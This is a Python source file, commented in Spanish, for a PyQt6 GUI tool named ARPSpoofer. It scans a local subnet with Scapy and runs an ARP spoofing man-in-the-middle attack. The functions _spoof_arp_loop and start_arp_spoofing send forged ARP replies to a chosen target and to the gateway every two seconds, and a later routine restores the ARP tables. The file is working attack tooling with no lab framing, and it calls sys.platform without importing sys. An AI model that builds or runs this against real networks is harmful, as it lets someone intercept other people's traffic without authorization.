import os
import ipaddress
import re
import socket
import threading
import time
import uuid
import json # Para persistencia de configuración

from scapy.all import ARP, Ether, send, srp
from PyQt6.QtCore import QObject, pyqtSignal, QSettings

class ARPSpooferModel(QObject):
    """
    Modelo en la arquitectura MVC. Contiene la lógica de negocio,
    la gestión de datos y las operaciones de red.
    Emite señales para comunicar cambios y estado a la vista.
    """
    # Señales para comunicar con el Controller/View
    logMessage = pyqtSignal(str, str) # message, color (e.g., "Estado: Listo", "blue")
    statusMessage = pyqtSignal(str, str) # text, color
    devicesUpdated = pyqtSignal(list) # list of discovered devices
    scanButtonState = pyqtSignal(bool) # True for enabled, False for disabled
    startButtonState = pyqtSignal(bool)
    stopButtonState = pyqtSignal(bool)
    
    # Rutas de archivos
    OU_FILE = os.path.join("data", "ou.txt")
    OUI_DATABASE_FILE = os.path.join("data", "oui.txt")

    # Valores predefinidos de zoom en porcentaje
    ZOOM_LEVELS = [75, 90, 100, 110, 125, 150, 175, 200]
    DEFAULT_ZOOM_INDEX = 2 # 100%

    def __init__(self):
        super().__init__()
        self.ip_gateway = None
        self.mac_attacker = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
        self.attack_in_progress = False
        self.spoof_thread = None
        self.discovered_devices = []
        self.oui_database = {}

        # Cache para restauración ARP
        self.target_ip_cache = None
        self.target_mac_cache = None
        self.gateway_mac_cache = None

        self._load_configuration() # Cargar configuración al inicio
        
        # Asegurarse de que el directorio 'data' exista
        os.makedirs(os.path.dirname(self.OU_FILE), exist_ok=True)

        self._load_oui_database()
        self._initialize_network_info()
        self._load_devices_from_file()

    def _load_configuration(self):
        """Carga la configuración persistente usando QSettings."""
        settings = QSettings("MiEmpresa", "ARPSpoofer") # Nombre de la empresa y app
        self.current_zoom_index = settings.value("zoom_index", self.DEFAULT_ZOOM_INDEX, type=int)
        if not (0 <= self.current_zoom_index < len(self.ZOOM_LEVELS)):
            self.current_zoom_index = self.DEFAULT_ZOOM_INDEX
        
        # Emitir la señal para que el View aplique el zoom cargado
        self.logMessage.emit(f"Configuración de zoom cargada: {self.ZOOM_LEVELS[self.current_zoom_index]}%", "blue")
        self.statusMessage.emit("Estado: Configuración cargada", "blue")

    def _save_configuration(self):
        """Guarda la configuración actual usando QSettings."""
        settings = QSettings("MiEmpresa", "ARPSpoofer")
        settings.setValue("zoom_index", self.current_zoom_index)
        self.logMessage.emit("Configuración guardada.", "blue")
        settings.sync() # Forzar la escritura a disco

    def get_current_zoom_percentage(self):
        """Devuelve el porcentaje de zoom actual."""
        return self.ZOOM_LEVELS[self.current_zoom_index]

    def zoom_in(self):
        """Incrementa el nivel de zoom y guarda la configuración."""
        if self.current_zoom_index < len(self.ZOOM_LEVELS) - 1:
            self.current_zoom_index += 1
            self._save_configuration()
            self.logMessage.emit(f"Zoom al {self.ZOOM_LEVELS[self.current_zoom_index]}%", "blue")
            return True # Indicates zoom changed
        return False

    def zoom_out(self):
        """Decrementa el nivel de zoom y guarda la configuración."""
        if self.current_zoom_index > 0:
            self.current_zoom_index -= 1
            self._save_configuration()
            self.logMessage.emit(f"Zoom al {self.ZOOM_LEVELS[self.current_zoom_index]}%", "blue")
            return True # Indicates zoom changed
        return False

    def _is_valid_ip(self, ip):
        try:
            ipaddress.IPv4Address(ip)
            return True
        except ipaddress.AddressValueError:
            return False

    def _get_mac(self, ip):
        """
        Obtiene la dirección MAC de un dispositivo dada su IP utilizando Scapy.
        """
        try:
            arp_request = ARP(pdst=ip)
            ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether_frame / arp_request
            result = srp(packet, timeout=1, verbose=0)[0]
            for sent, received in result:
                return received.hwsrc
            return None
        except Exception:
            return None

    def _get_gateway_ip(self):
        """
        Obtiene la dirección IP de la puerta de enlace por defecto.
        """
        if sys.platform.startswith('win'):
            try:
                output = os.popen('route print').read()
                match = re.search(r'\s+0\.0\.0\.0\s+0\.0\.0\.0\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
                if match:
                    return match.group(1)
                else:
                    match = re.search(r'Default Gateway:\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
                    if match:
                        return match.group(1)
            except Exception as e:
                self.logMessage.emit(f"Error al obtener puerta de enlace en Windows: {e}", "red")
            return None
        elif sys.platform.startswith('linux') or sys.platform == 'darwin':
            try:
                output = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
                if output:
                    return output
                output = os.popen("netstat -rn | grep default | awk '{print $2}'").read().strip()
                if output:
                    return output
            except Exception as e:
                self.logMessage.emit(f"Error al obtener puerta de enlace en Linux/macOS: {e}", "red")
            return None
        else:
            self.logMessage.emit("Sistema operativo no soportado para detección automática de puerta de enlace.", "red")
            return None

    def _get_local_ip_and_subnet(self):
        """
        Obtiene la dirección IP local del atacante y deriva una subred /24.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            network = ipaddress.ip_network(f"{local_ip}/24", strict=False)
            return str(network.network_address), str(network.prefixlen)
        except Exception as e:
            self.logMessage.emit(f"Error al obtener IP local y subred: {e}", "orange")
            return None, None

    def _resolve_hostname(self, ip):
        """Intenta resolver el hostname de una dirección IP."""
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            return hostname
        except socket.herror:
            return "N/A"
        except Exception:
            return "Error"

    def _load_oui_database(self):
        """
        Carga la base de datos de OUI (Organizationally Unique Identifier) desde oui.txt.
        """
        self.oui_database = {}
        if os.path.exists(self.OUI_DATABASE_FILE):
            self.logMessage.emit(f"Cargando base de datos OUI desde {self.OUI_DATABASE_FILE}...", "blue")
            try:
                with open(self.OUI_DATABASE_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        match = re.match(r'^([0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2})\s+\(hex\)\s+(.+)', line)
                        if match:
                            oui_prefix = match.group(1).replace('-', '').upper()
                            organization = match.group(2).strip()
                            self.oui_database[oui_prefix] = organization
                self.logMessage.emit(f"Cargados {len(self.oui_database)} entradas OUI.", "green")
            except Exception as e:
                self.logMessage.emit(f"Error al cargar la base de datos OUI: {e}", "red")
        else:
            self.logMessage.emit(f"Archivo OUI '{self.OUI_DATABASE_FILE}' no encontrado. La identificación de fabricante no estará disponible.", "orange")

    def _get_vendor(self, mac_address):
        """
        Dado una dirección MAC completa, devuelve el nombre del fabricante.
        """
        if not mac_address or len(mac_address) < 8:
            return "Inválido"
        
        mac_prefix = mac_address.replace(':', '').replace('-', '').upper()[:6]
        return self.oui_database.get(mac_prefix, "Desconocido")

    def _load_devices_from_file(self):
        """
        Carga dispositivos de ou.txt.
        """
        self.discovered_devices = []
        if os.path.exists(self.OU_FILE):
            self.logMessage.emit(f"Cargando dispositivos conocidos desde {self.OU_FILE}...", "blue")
            try:
                with open(self.OU_FILE, 'r') as f:
                    for line in f:
                        parts = line.strip().split(',')
                        ip, mac, hostname, vendor = "N/A", "N/A", "N/A", "N/A (Antiguo)"

                        if len(parts) == 4:
                            ip, mac, hostname, vendor = parts
                        elif len(parts) == 3:
                            ip, mac, hostname = parts
                            vendor = "N/A (Antiguo)"
                        else:
                            self.logMessage.emit(f"Línea mal formada en {self.OU_FILE}: {line.strip()}", "orange")
                            continue

                        if self._is_valid_ip(ip):
                            self.discovered_devices.append({'ip': ip, 'mac': mac, 'hostname': hostname, 'vendor': vendor})
                self.devicesUpdated.emit(self.discovered_devices) # Notificar al View
                self.logMessage.emit(f"Cargados {len(self.discovered_devices)} dispositivos desde {self.OU_FILE}.", "green")
            except Exception as e:
                self.logMessage.emit(f"Error al cargar dispositivos desde {self.OU_FILE}: {e}", "red")
        else:
            self.logMessage.emit(f"Archivo de dispositivos '{self.OU_FILE}' no encontrado. Se creará al escanear.", "orange")

    def _save_devices_to_file(self):
        """
        Guarda la lista actual de dispositivos descubiertos en ou.txt.
        """
        try:
            with open(self.OU_FILE, 'w') as f:
                for device in self.discovered_devices:
                    ip = device.get('ip', 'N/A')
                    mac = device.get('mac', 'N/A')
                    hostname = device.get('hostname', 'N/A')
                    vendor = device.get('vendor', 'Desconocido')
                    f.write(f"{ip},{mac},{hostname},{vendor}\n")
            self.logMessage.emit(f"Dispositivos guardados en {self.OU_FILE}.", "green")
        except Exception as e:
            self.logMessage.emit(f"Error al guardar dispositivos en {self.OU_FILE}: {e}", "red")

    def _initialize_network_info(self):
        """Inicializa la información de red crítica."""
        self.logMessage.emit("Obteniendo información de red inicial...", "blue")
        self.statusMessage.emit("Estado: Inicializando red...", "blue")
        try:
            self.ip_gateway = self._get_gateway_ip()
            if self.ip_gateway:
                self.logMessage.emit(f"Puerta de enlace detectada: {self.ip_gateway}", "green")
                self.statusMessage.emit("Estado: Puerta de enlace detectada", "green")
            else:
                self.logMessage.emit("Error: No se pudo obtener la IP de la puerta de enlace. Verifique su conexión de red o permisos.", "red")
                self.statusMessage.emit("Estado: Error de red", "red")
                self.startButtonState.emit(False) # Deshabilitar botón de inicio
                self.scanButtonState.emit(False) # Deshabilitar botón de escaneo

            local_ip_base, subnet_prefix = self._get_local_ip_and_subnet()
            if local_ip_base and subnet_prefix:
                self.logMessage.emit(f"Subred local detectada para escaneo: {local_ip_base}/{subnet_prefix}", "blue")
                # El Controller se encargará de pasar esta subred a la View
                self.subnet_to_set = f"{local_ip_base}/{subnet_prefix}"
            else:
                self.logMessage.emit("No se pudo detectar automáticamente la IP local/subred. Ingrese manualmente para escanear.", "orange")
                self.subnet_to_set = ""

        except Exception as e:
            self.logMessage.emit(f"Error al inicializar información de red: {e}", "red")
            self.statusMessage.emit("Estado: Error de inicialización", "red")
            self.startButtonState.emit(False)
            self.scanButtonState.emit(False)
            self.subnet_to_set = ""

    def start_scan_network(self, subnet):
        """
        Inicia el proceso de escaneo de red en un hilo separado.
        """
        if not subnet:
            self.logMessage.emit("Advertencia: Por favor, ingrese una subred para escanear (ej. 192.168.1.0/24).", "orange")
            self.statusMessage.emit("Estado: Escaneo fallido - subred no válida", "orange")
            return False

        try:
            ipaddress.ip_network(subnet, strict=False)
        except ValueError:
            self.logMessage.emit(f"Advertencia: La subred ingresada '{subnet}' no es válida. Use el formato X.X.X.X/YY.", "orange")
            self.statusMessage.emit("Estado: Escaneo fallido - subred no válida", "orange")
            return False

        self.logMessage.emit(f"Iniciando escaneo de red en {subnet}...", "blue")
        self.statusMessage.emit("Estado: Escaneando...", "blue")
        self.scanButtonState.emit(False) # Deshabilitar botón de escaneo

        scan_thread = threading.Thread(target=self._scan_network_async, args=(subnet,), daemon=True)
        scan_thread.start()
        return True

    def _scan_network_async(self, subnet):
        """
        Realiza el escaneo de red de forma asíncrona.
        """
        newly_discovered_devices = []
        try:
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=3, verbose=0)
            
            for sent, received in ans:
                ip = received.psrc
                mac = received.hwsrc
                hostname = self._resolve_hostname(ip)
                vendor = self._get_vendor(mac)

                device_info = {'ip': ip, 'mac': mac, 'hostname': hostname, 'vendor': vendor}
                newly_discovered_devices.append(device_info)

                found = False
                for existing_device in self.discovered_devices:
                    if existing_device['ip'] == ip:
                        existing_device.update(device_info)
                        found = True
                        break
                if not found:
                    self.discovered_devices.append(device_info)
                
                self.logMessage.emit(f"Descubierto: IP {ip} | MAC {mac} | Hostname {hostname} | Fabricante {vendor}", "purple")
                self.devicesUpdated.emit(self.discovered_devices) # Notificar al View

            self.logMessage.emit(f"Escaneo completado. Descubiertos {len(newly_discovered_devices)} dispositivos activos.", "green")
            self.statusMessage.emit("Estado: Escaneo completado", "green")
            self._save_devices_to_file()
        except Exception as e:
            self.logMessage.emit(f"Error durante el escaneo: {e}", "red")
            self.statusMessage.emit("Estado: Error durante el escaneo", "red")
        finally:
            self.scanButtonState.emit(True) # Habilitar botón de escaneo

    def start_arp_spoofing(self, target_ip):
        """
        Inicia el ataque ARP spoofing en un hilo separado.
        """
        if not target_ip:
            self.logMessage.emit("Advertencia: Por favor, ingrese una dirección IP objetivo.", "orange")
            self.statusMessage.emit("Estado: Ataque fallido - IP objetivo no válida", "orange")
            return False
        if not self._is_valid_ip(target_ip):
            self.logMessage.emit(f"Advertencia: La IP objetivo '{target_ip}' ingresada no es válida.", "orange")
            self.statusMessage.emit("Estado: Ataque fallido - IP objetivo no válida", "orange")
            return False
        if not self.ip_gateway:
            self.logMessage.emit("Error: No se pudo obtener la IP de la puerta de enlace. No se puede iniciar el ataque.", "red")
            self.statusMessage.emit("Estado: Ataque fallido - Puerta de enlace no disponible", "red")
            return False
        if target_ip == self.ip_gateway:
            self.logMessage.emit("Advertencia: La IP objetivo no puede ser la misma que la puerta de enlace.", "orange")
            self.statusMessage.emit("Estado: Ataque fallido - IP objetivo es la puerta de enlace", "orange")
            return False

        self.logMessage.emit("Iniciando ataque ARP Spoofing...", "blue")
        self.statusMessage.emit("Estado: Iniciando ataque...", "blue")
        self.startButtonState.emit(False) # Deshabilitar botón de inicio
        self.stopButtonState.emit(True) # Habilitar botón de detener

        # Prepara y lanza el ataque en un hilo asíncrono para no bloquear la GUI
        def prepare_and_start_async():
            target_mac = self._get_mac(target_ip)
            if not target_mac:
                self.logMessage.emit(f"No se pudo obtener la dirección MAC del objetivo {target_ip}. Ataque cancelado.", "red")
                self.statusMessage.emit("Estado: Fallo al obtener MAC objetivo", "red")
                self.stop_arp_spoofing() # Detiene y resetea botones
                return

            gateway_mac = self._get_mac(self.ip_gateway)
            if not gateway_mac:
                self.logMessage.emit(f"No se pudo obtener la dirección MAC de la puerta de enlace {self.ip_gateway}. Ataque cancelado.", "red")
                self.statusMessage.emit("Estado: Fallo al obtener MAC puerta de enlace", "red")
                self.stop_arp_spoofing()
                return

            self.target_ip_cache = target_ip
            self.target_mac_cache = target_mac
            self.gateway_mac_cache = gateway_mac

            self.logMessage.emit(f"MAC del atacante: {self.mac_attacker}", "purple")
            self.logMessage.emit(f"MAC del objetivo {target_ip}: {target_mac}", "purple")
            self.logMessage.emit(f"MAC de la puerta de enlace {self.ip_gateway}: {gateway_mac}", "purple")

            self.attack_in_progress = True
            self.spoof_thread = threading.Thread(target=self._spoof_arp_loop, args=(target_ip, target_mac, self.ip_gateway, gateway_mac), daemon=True)
            self.spoof_thread.start()
            self.logMessage.emit("Ataque ARP Spoofing en curso...", "green")
            self.statusMessage.emit("Estado: Atacando...", "green")
        
        threading.Thread(target=prepare_and_start_async, daemon=True).start()
        return True

    def _spoof_arp_loop(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """
        Bucle principal del ataque ARP spoofing.
        """
        try:
            arp_response_target = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=self.mac_attacker, op=2)
            arp_response_gateway = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=self.mac_attacker, op=2)

            while self.attack_in_progress:
                send(arp_response_target, verbose=0)
                send(arp_response_gateway, verbose=0)
                self.logMessage.emit(f"Enviando ARP spoofing a {target_ip} y {gateway_ip}...", "green")
                time.sleep(2)
        except Exception as e:
            self.logMessage.emit(f"Ocurrió un error durante el spoofing: {e}", "red")
            self.statusMessage.emit("Estado: Error durante el spoofing", "red")
        finally:
            self.attack_in_progress = False
            self.logMessage.emit("Hilo de spoofing terminado.", "blue")
            self.statusMessage.emit("Estado: Inactivo", "black")
            self.startButtonState.emit(True) # Habilitar botón de inicio
            self.stopButtonState.emit(False) # Deshabilitar botón de detener

            # Intentar restaurar la conexión
            if self.target_ip_cache and self.ip_gateway and self.target_mac_cache and self.gateway_mac_cache:
                threading.Thread(target=self._restore_connection_async,
                                 args=(self.target_ip_cache, self.target_mac_cache,
                                       self.ip_gateway, self.gateway_mac_cache),
                                 daemon=True).start()
            else:
                self.logMessage.emit("No se puede restaurar la conexión: información MAC no disponible.", "orange")

    def stop_arp_spoofing(self):
        """
        Detiene el ataque ARP spoofing.
        """
        if self.attack_in_progress:
            self.logMessage.emit("Solicitud de detención recibida...", "blue")
            self.statusMessage.emit("Estado: Deteniendo ataque...", "blue")
            self.attack_in_progress = False # Señaliza al bucle de spoofing para que se detenga
        else:
            self.logMessage.emit("El ataque no está en curso.", "orange")
            self.statusMessage.emit("Estado: Inactivo", "black")
            self.startButtonState.emit(True)
            self.stopButtonState.emit(False)

    def _restore_connection_async(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """
        Restaura las tablas ARP correctas en el objetivo y la puerta de enlace.
        """
        self.logMessage.emit("Intentando restaurar la conexión...", "blue")
        try:
            arp_restore_target = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
            arp_restore_gateway = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac, op=2)

            send(arp_restore_target, count=5, verbose=0)
            send(arp_restore_gateway, count=5, verbose=0)
            self.logMessage.emit("Conexión restaurada exitosamente.", "green")
            self.statusMessage.emit("Estado: Conexión restaurada", "green")
        except Exception as e:
            self.logMessage.emit(f"Error al restaurar la conexión: {e}", "red")
            self.statusMessage.emit("Estado: Error al restaurar conexión", "red")